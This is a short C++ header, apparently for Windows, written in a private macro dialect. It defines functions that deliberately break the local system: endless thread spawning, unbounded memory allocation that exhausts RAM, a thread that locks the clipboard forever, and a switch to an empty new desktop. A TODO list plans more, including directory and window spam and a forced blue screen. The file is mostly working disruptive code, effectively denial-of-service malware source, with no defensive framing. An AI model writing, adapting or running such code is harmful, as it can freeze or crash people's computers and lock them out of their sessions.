#pragma once

#ifdef PROG_THD_CNT_SINGLE
	#error "PROG_THD_CNT_SINGLE with INCLUDE_DUMB is not supported!"
#endif

dfa NT DumbSysBreakThdSpam() {
	Thd thd;
	while (YES) {
		thd.Start([](LPVOID p) { ThdWait(1 << (sizbit(S4) - 2)); ret DWORD(0); unused(p); }, NUL);
		thd.__Drop();
	}
}
dfa NT DumbSysBreakMemFill() {
	cx SI pageSize = MemPageSizeGet();
	SI cnt = 1;
	while (YES) {
		GA buf = NUL;
		ife (MemAllocSys(&buf, cnt * pageSize)) {
			cnt = Max<SI>(cnt >> 1, 1);
		} else {
			ite (i, i < cnt) *((U1*)buf + i * pageSize) = 0;
			cnt <<= 1;
		}
	}
}
dfa NT DumbClipbBreakLock() {
	Thd thd;
	thd.Start([](LPVOID p) { while (YES) { OpenClipboard(NUL); ThdWait(1000); } ret DWORD(0); unused(p); }, NUL);
	thd.__Drop();
}
dfa NT DumbDeskBreakVoid() {
	SwitchDesktop(CreateDesktopW(L"DumbDeskBreakVoid", NUL, NUL, 0, DESKTOP_CREATEWINDOW | GENERIC_ALL, NUL));
}
// TODO:
// DumbScnBreakSize
// DumbFileLockSelf
// DumbDirSpam
// DumbWinSpam
// DumbSysStopBlue
